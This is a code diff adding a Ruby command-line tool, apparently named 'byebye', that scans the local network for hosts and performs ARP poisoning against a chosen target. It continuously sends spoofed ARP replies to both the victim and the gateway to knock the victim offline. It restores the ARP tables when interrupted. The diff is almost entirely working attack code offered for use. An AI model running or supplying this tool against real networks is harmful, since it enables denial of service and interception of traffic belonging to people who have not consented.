@@ -1,14 +1,69 @@
 #!/usr/bin/env ruby
 require "rubygems"
 require "bundler/setup"
+
+# System gems
 require 'optparse'
 require 'ostruct'
+require 'socket'
 
+# Networking gems
 require 'packetfu'
+require 'ipscanner'
 
+# Others
+require 'terminal-table'
+require 'colorize'
+
+# Send a standard ARP packet from source (you) to destination (victim)
+def poison_victim(iface, mac, gateway_ip, address, address_mac)
+  # Create a ARP packet sent to victim
+  arp_packet = PacketFu::ARPPacket.new
+  arp_packet.eth_saddr = mac
+  arp_packet.eth_daddr = address_mac
+
+  arp_packet.arp_saddr_mac = mac
+  arp_packet.arp_daddr_mac = address_mac
+  arp_packet.arp_saddr_ip = gateway_ip
+  arp_packet.arp_daddr_ip = address
+  arp_packet.arp_opcode = 2  
+  arp_packet.to_w(iface)  
+end
+
+# Send a malformed ARP packet from source to bad router address
+def poison_router(iface, mac, gateway_ip, gateway_mac, address)
+  arp_packet_router = PacketFu::ARPPacket.new
+  arp_packet_router.eth_saddr = mac        
+  arp_packet_router.eth_daddr = '12:34:56:78:9A:BC'          
+  
+  arp_packet_router.arp_saddr_mac = mac    
+  arp_packet_router.arp_daddr_mac = '12:34:56:78:9A:BC'     
+  arp_packet_router.arp_saddr_ip = address        
+  arp_packet_router.arp_daddr_ip = gateway_ip        
+  arp_packet_router.arp_opcode = 2 
+  arp_packet_router.to_w(iface)       
+            
+end
+
+# safely kill program by sending conventional packet with correct source and destination
+def restore(iface, mac, gateway_ip, gateway_mac, address)
+  arp_restore = PacketFu::ARPPacket.new
+  arp_restore.eth_saddr = mac        
+  arp_restore.eth_daddr = gateway_mac         
+  
+  arp_restore.arp_saddr_mac = mac    
+  arp_restore.arp_daddr_mac = gateway_mac    
+  arp_restore.arp_saddr_ip = address        
+  arp_restore.arp_daddr_ip = gateway_ip        
+  arp_restore.arp_opcode = 2 
+  arp_restore.to_w(iface)   
+end
+
+
+# Create a OpenStruct for option parsing
 options = OpenStruct.new
 
-
+# Header graphics
 header = """ 
 
  _             _             
@@ -18,16 +73,90 @@ header = """
       |__/          |__/       
      Written by: @ex0dus-0x   \n\n"""
      
-puts header
+puts header.colorize(:green)
 
+
+# Instantiate Parser, grab service and iface
 OptionParser.new do |opt|
-  opt.on('-s SERVICE') { |o| options.service = o }
-  opt.on('-i IFACE') { |o| options.iface = o}
+  opt.banner = "Usage: ./byebye [options]"
+
+  opt.on('-i IFACE', "--interface IFACE", "Input network interface, otherwise defaults") { |o| options.iface = o}
+  opt.on('-a ADDRESS', "--address ADDRESS", "Input target address, otherwise prints host table"){ |o| options.address = o}
+
+  opt.on_tail("-h", "--help", "Show this message") do
+    puts opt
+    exit
+  end
 end.parse!
 
-if options.service == "web"
-  require_relative "src/web"
+# iface is set to option, otherwise defaulted.
+# Using iface, grab a hash for our network info...
+iface = options.iface || PacketFu::Utils.default_int
+info = PacketFu::Utils.whoami?(:iface => iface)
+
+# ... and store key symbols as variables
+
+# This field for the local area network address
+ip = info[:ip_saddr]
+# This field for MAC Address
+mac = info[:eth_saddr]
+
+# This "hacky" way to get gateway IP and MAC Address
+gateway_ip = 
+  case Gem::Platform.local.os
+    when "darwin" then `netstat -rn -f inet | grep 'default' | awk '{print $2}'`
+    else `ip route | awk '/default/{print $3}'`
+  end
+gateway_mac = PacketFu::Utils.arp(gateway_ip, :iface => iface)
+
+
+config = PacketFu::Utils.ifconfig(iface)
+
+# create a global array for terminal-table
+$rows = []
+# create a global variable for address option, even if none is provided
+$address = options.address || nil
+
+puts "Interface: #{iface} \nLocal Area IP: #{ip}\nMAC: #{mac}\n\nGateway IP: #{gateway_ip}Gateway MAC: #{gateway_mac}\n"
+sleep 3
+
+
+if ( $address == nil )
+  puts "\n-a flag NOT set. Displaying host table: ".colorize(:yellow)
+
+  # for each ip address in LAN, print in a new terminal-table row
+  Socket.do_not_reverse_lookup = false
+  IPScanner.scan.each { | i |
+      $rows << ["#{Socket.getaddrinfo(i, nil)[1][2]}", "#{Socket.getaddrinfo(i, nil)[1][3]}"]      
+        # => Name, IP Address
+  }
+
+  # instantiate table w/ header and created rows, output it
+  table = Terminal::Table.new :headings => ["Hostname", "Local Area Network Address"], :rows => $rows
+  
+  puts table
+  
+  print "> Enter your target selection: "
+  $address = gets.chomp
+    
 end
 
-iface = options.iface || PacketFu::Utils.default_int
-config = PacketFu::Utils.ifconfig(iface)
+# Grab MAC Address of Victim
+$address_mac = PacketFu::Utils.arp($address, :iface => iface) 
+
+
+while true
+  begin
+    sleep 1
+    puts "Deauthenticating... #{$address}"
+    
+    poison_victim(iface, mac, gateway_ip, $address, $address_mac)
+    poison_router(iface, mac, gateway_ip, gateway_mac, $address)
+    
+  rescue Interrupt
+    restore(iface, mac, gateway_ip, gateway_mac, $address)
+    puts "Killing program! Exiting.".colorize(:red)
+    exit
+  end
+end 
+
